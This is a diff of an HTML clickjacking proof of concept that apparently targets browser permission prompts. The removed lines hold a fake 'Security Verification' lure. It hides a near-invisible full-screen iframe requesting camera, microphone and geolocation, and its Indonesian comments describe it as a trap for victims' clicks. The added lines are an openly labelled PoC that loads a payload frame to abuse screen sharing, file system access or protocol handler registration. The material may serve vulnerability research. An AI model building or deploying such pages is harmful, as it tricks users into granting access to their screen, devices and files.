@@ -1,69 +1,35 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>Account Verification</title>
-  <style>
-    body, html {
-      margin: 0; 
-      padding: 0; 
-      height: 100%;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #f8f9fa;
-      overflow: hidden;
-    }
-    .container {
-      display: flex; 
-      flex-direction: column;
-      align-items: center; 
-      justify-content: center;
-      height: 100vh; 
-      text-align: center;
-      padding: 20px;
-      box-sizing: border-box;
-    }
-    h2 { 
-      color: #202124; 
-      margin-bottom: 10px; 
-      font-size: 22px;
-    }
-    p { 
-      color: #1a73e8; 
-      font-size: 18px; 
-      font-weight: 600; 
-      animation: pulse 1.5s infinite;
-    }
-    @keyframes pulse {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
-    }
-    
-    /* 
-       THE INVISIBLE TRAP 
-       Iframe dibikin transparan dan nutupin 100% layar. 
-       Korban ngeklik layar = ngeklik iframe = bypass tereksekusi!
-    */
-    #frame {
-      position: absolute;
-      top: 0; 
-      left: 0;
-      width: 100vw; 
-      height: 100vh;
-      border: 0;
-      z-index: 999;
-      opacity: 0.01; 
-    }
-  </style>
+<style>
+html, body { font-family: sans-serif; overflow: hidden; }
+#instructions { text-align: center; margin-top: 50px; font-size: 1.5em; user-select: none; font-weight: bold;}
+#frame { position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; border: 0; }
+#variations { padding: 1em; border-radius: 8px; position: relative; z-index: 2; width: fit-content; margin: 20px auto; border: 1px solid #999; background: white; }
+li { margin: 10px 0; font-size: 1.2em; }
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
-  <div class="container">
-    <h2>Security Verification</h2>
-    <p>👆 TAP ANYWHERE TO CONTINUE 👆</p>
-  </div>
+<h2 style="text-align: center;">PoC: Native UI Ligature Bypass (Real Vuln)</h2>
+<div id="variations">
+    <strong>The Forgotten APIs:</strong>
+    <ul>
+        <li><a href="?mode=screenshare">1. Screen Share (getDisplayMedia)</a></li>
+        <li><a href="?mode=filesystem">2. File System Access (showOpenFilePicker)</a></li>
+        <li><a href="?mode=protocol">3. Protocol Handler (registerProtocol)</a></li>
+    </ul>
+</div>
+<p id="instructions">Click anywhere</p>
 
-  <!-- Ini akan meload file UI Redressing lu secara tersembunyi -->
-  <iframe id="frame" allow="camera *; microphone *; geolocation *" src="ligatures-perm-frame.html"></iframe>
+<iframe id="frame" allow="display-capture *; camera *; microphone *"></iframe>
+
+<script>
+var searchParams = new URLSearchParams(window.location.search);
+var mode = searchParams.get('mode') || 'screenshare';
+
+// Arahkan ke file payload. Pastikan diload dari domain googlelogoligature!
+frame.src = 'ligatures-perm-frame.html?mode=' + mode;
+</script>
 </body>
 </html>
